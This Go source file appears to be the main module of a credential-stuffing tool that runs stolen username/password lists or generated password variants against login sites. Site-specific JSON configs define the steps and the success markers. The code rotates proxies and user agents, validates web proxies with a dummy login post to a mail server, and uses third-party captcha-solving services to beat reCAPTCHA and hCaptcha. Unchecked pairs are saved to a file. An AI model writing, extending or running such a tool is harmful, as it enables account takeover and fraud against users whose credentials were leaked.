package main

import (
	"encoding/json"
	"fmt"
	"os"
	"runtime"
	"strconv"
	"strings"
	"sync"
	"time"
)

type step struct {
	GetCookies                string
	SetCookies                string
	SetHeaders                []string
	DeleteHeaders             []string
	DeleteCookies             []string
	GetContent                string
	OptionContent             string
	PostFetchContent          string
	PostVars                  string
	AddToPostVars             string
	ProxyGood                 string
	ComboGood                 string
	ContinueGood              string
	CaptchaGood               string
	Skip                      bool
	GoogleCaptchaV2           string
	GoogleCaptchaV2Enterprise string
	GoogleCaptchaV3           string
	GoogleCaptchaV3Enterprise string

	HCaptchaV2   string
	ImageCaptcha string
	GetPostVars  []StepToGetPostVar
}

type StepToGetPostVar struct {
	LineWith     string
	CookieName   string
	Reset        string
	FromLineWith string
	ToLineWith   string
	Except       string
	PostKey      string
	SplitString  string
	TakeIndex    string
}

type captchaSolver interface {
	solve()
}

type captchaPoller interface {
	pollResult()
}

func comboWorker(
	id int,
	configContent string,
	socksHTTPProxyList []string,
	webproxyList []string,
	comboList <-chan *combo,
	uncheckedCombos chan<- *combo,
	wg *sync.WaitGroup,
	captchaApis *CaptchaApis, userAgents []string) {
	//parse json in configContent
	var jsonData []step
	err := json.Unmarshal([]byte(configContent), &jsonData)
	if err != nil {
		//fmt.Println(configContent)
		//fmt.Println(err)
		panic("invalid config")
	}
	//jData := extractJsonData(jsonData)
	defer wg.Done()
	for combo := range comboList {
		//combo.mutex.Lock()
		combo.stepper(id,
			configContent,
			socksHTTPProxyList,
			webproxyList,
			uncheckedCombos,
			captchaApis,
			jsonData, userAgents)
		//combo.mutex.Unlock()
	}
}

func writeout(uncheckedCombos <-chan *combo, wg *sync.WaitGroup) {
	defer wg.Done()
	for combo := range uncheckedCombos {
		//we should save combo to file as unchecked after 3 tries
		writeToFile("unchecked-combos.txt", combo.username+"::"+combo.password)
		//fmt.Println(combo.username, combo.retryCount, combo.lastWorkerId
	}
}

func loadWebProxies(filename string, userAgents []string) []string {
	webProxyList := ReadFile(filename)
	if len(webProxyList) == 1 {
		fmt.Println(webProxyList)
		return []string{""}
	}
	var wpg sync.WaitGroup
	jbs := make(chan string, 1000)
	gdpx := make(chan string, len(webProxyList))
	for x := 0; x < 200; x++ {
		userAgent := userAgents[x%len(userAgents)]
		wpg.Add(1)
		go func() {
			for prox := range jbs {
				if len(prox) < 4 {
					continue
				}
				var wpi WebProxyInit
				tim := 23
				fmt.Printf("testing %s %s\r", prox, strings.Repeat(" ", len(prox)))
				wp := wpi.init(prox, tim, userAgent)
				//issuing get and post requests will actually check if the web proxy supports post
				testURL := "https://mail.zimbra.com/"
				wp.getRequest(testURL, "", tim)
				postB := "loginOp=login&login_csrf=01ffhgfh1f7-efgh7-4fgc-8ffb-0a2fe3ed37"
				postB += "85&username=fbbetb&password=sdvdfgbfdbfd&client=preferred"
				wp.postRequest(testURL, postB, "", tim)
				if wp.supportsPostRequest() == true {
					fmt.Println("found webproxy " + prox + ": " + wp.proxyType())
					gdpx <- prox
				}
				/* if wp.proxyType == "glype" {
					fmt.Println(wp)
				} */
			}
			wpg.Done()
		}()
	}
	for _, proxi := range webProxyList {
		jbs <- proxi
	}
	close(jbs)
	wpg.Wait()
	var goodWebProxies []string
	loop := true
	for loop {
		select {
		case prx := <-gdpx:
			goodWebProxies = append(goodWebProxies, prx)
		case <-time.After(time.Second * 5):
			loop = false
		}
	}
	if len(goodWebProxies) == 0 {
		panic("no valid web proxy found")
	}
	return goodWebProxies
}

func saveCombos(configName string, combos *[]string) {
	fileSuffix := strings.Replace(configName, ".json", ".txt", 1)
	writeToFile("clean-combo-"+fileSuffix,
		strings.Join(*combos, "\n"))
}

func loadUserAgents(filename string) []string {
	userAgents := []string{}
	rawContentList := ReadFile(filename)
	err := json.Unmarshal([]byte(strings.Join(rawContentList, "\n")), &userAgents)
	if err != nil {
		panic(err)
	}
	//check for desktop user agents
	retAgentList := []string{}
	for _, agent := range userAgents {
		agentObj := NewUserAgent(agent)
		if agentObj.isDesktopPlatform() {
			retAgentList = append(retAgentList, agent)
		}
	}
	if len(retAgentList) == 0 {
		panic("empty list of user agents")
	}
	return retAgentList
}

func main() {
	ticker := time.NewTicker(time.Second * 10)
	//kick of ticker to print number of goroutines at
	//30 seconds interval
	go func() {
		for range ticker.C {
			fmt.Printf("\nrunning with %d goroutines\n", runtime.NumGoroutine())
		}
	}()
	userAgents := loadUserAgents("useragents.json")
	numThreads, _ := strconv.Atoi(os.Args[1])
	numSecondWorkerGroup := numThreads / 2
	numThirdWorkerGroup := numSecondWorkerGroup / 2
	//var purifier ComboPurifier
	combos := ReadFile("combo.txt")
	//load api keys
	var captchaApis CaptchaApis
	captchaApis.load("apikeys.json")
	//discard spammy combos
	configString := ReadFile(os.Args[2])[0]
	var jsonData []step
	err := json.Unmarshal([]byte(configString), &jsonData)
	if err != nil {
		//fmt.Println(configContent)
		//fmt.Println(err)
		panic("invalid config")
	}
	//fmt.Println(configString, "pooooop")
	webProxies := []string{""}
	httpSocksProxies := []string{""}
	if FileExists("proxies.txt") {
		proxyGood := strings.Split(jsonData[0].ProxyGood, "::")[1]
		fmt.Println("testing proxies on -> ", jsonData[0].GetContent, `, looking for ->"`, proxyGood, `"`)
		httpSocksProxies = LoadProxies("proxies.txt", jsonData[0].GetContent, jsonData[0].ProxyGood, userAgents[0])
		fmt.Printf("working with %d valid proxies\n", len(httpSocksProxies))
		time.Sleep(time.Second * 3)
	}
	if len(httpSocksProxies) < 2 && FileExists("webproxies.txt") {
		webProxies = loadWebProxies("webproxies.txt", userAgents)
	}
	if len(webProxies) < 2 && len(httpSocksProxies) < 2 {
		panic("no proxies to work with quiting")
	}
	fmt.Println("finished loading proxies")
	//fmt.Println("filtering combos using site specific user:pass parameters")
	//this burns time
	//combos = purifier.fromComboList(&combos).purify()
	//save valid combos
	//saveCombos(os.Args[2], &combos)
	fmt.Printf("working with %d combos\n", len(combos))
	time.Sleep(time.Second * 3)
	comboChan := make(chan *combo, 10000)
	comboChanTwo := make(chan *combo, 5000)
	comboChanThree := make(chan *combo, 2500)
	comboChanFour := make(chan *combo, 2000)
	//pollerChan := make(chan captchaPoller, 1000)

	var wg, wg2, wg3, wg4 sync.WaitGroup
	var x int
	for x = 1; x <= numThreads; x++ {
		wg.Add(1)
		go comboWorker(x, configString, httpSocksProxies, webProxies, comboChan,
			comboChanTwo, &wg, &captchaApis, userAgents)
	}

	//second group of workers
	for x = 1; x <= numSecondWorkerGroup; x++ {
		wg2.Add(1)
		go comboWorker(x, configString, httpSocksProxies, webProxies, comboChanTwo,
			comboChanThree, &wg2, &captchaApis, userAgents)
	}

	//third group of workers
	for x = 1; x <= numThirdWorkerGroup; x++ {
		wg3.Add(1)
		go comboWorker(x, configString, httpSocksProxies, webProxies, comboChanThree,
			comboChanFour, &wg3, &captchaApis, userAgents)
	}
	//start requeue worker
	wg4.Add(1)
	go writeout(comboChanFour, &wg4)
	//enqueue new jobs
	//load passwords transformer lists if first and second lines has no separator character set
	var passList []string
	if !strings.Contains(combos[0], "::") && !strings.Contains(combos[1], "::") && FileExists("passList.txt") {
		//load pass list
		passList = ReadFile("passList.txt")
	}
	if len(passList) > 0 {
		for w, apass := range passList {
			if len(apass) == 0 {
				continue
			}
			addi := w * len(combos)
			for x, comb := range combos {
				var cmb combo
				var hd Header
				var transformer myTransformer
				hd.init("", userAgents[x%len(userAgents)])
				if len(comb) > 2 {
					//cmb.mutex.Lock()
					cmb.id = x + addi
					cmb.username = comb
					cmb.password = transformer.usingInput(comb).transform(apass)
					cmb.retryCount = 0
					cmb.captchaApi, cmb.solverChan = captchaApis.pick(cmb.id, &hd, userAgents[x%len(userAgents)])
					//cmb.mutex.Unlock()
					comboChan <- &cmb

				}
			}
		}
	} else {
		for x, comb := range combos {
			comboParts := strings.Split(comb, "::")
			if len(comboParts) < 2 {
				comboParts = strings.Split(comb, ":")
			}
			var cmb combo
			var hd Header
			hd.init("", userAgents[x%len(userAgents)])
			if len(comboParts) == 2 {
				//cmb.mutex.Lock()
				cmb.id = x
				cmb.username = comboParts[0]
				cmb.password = comboParts[1]
				cmb.retryCount = 0
				cmb.captchaApi, cmb.solverChan = captchaApis.pick(cmb.id, &hd, userAgents[x%len(userAgents)])
				//cmb.mutex.Unlock()
				comboChan <- &cmb
			}
		}
	}

	//i can wait without closing jobs first because workers
	//will auto close after waiting to receive jobs from queue
	//for 10 seconds
	close(comboChan)
	wg.Wait()
	close(comboChanTwo)
	wg2.Wait()
	close(comboChanThree)
	wg3.Wait()
	close(comboChanFour)
	captchaApis.closeChannels()
	wg4.Wait()
	fmt.Println("All Done")

}
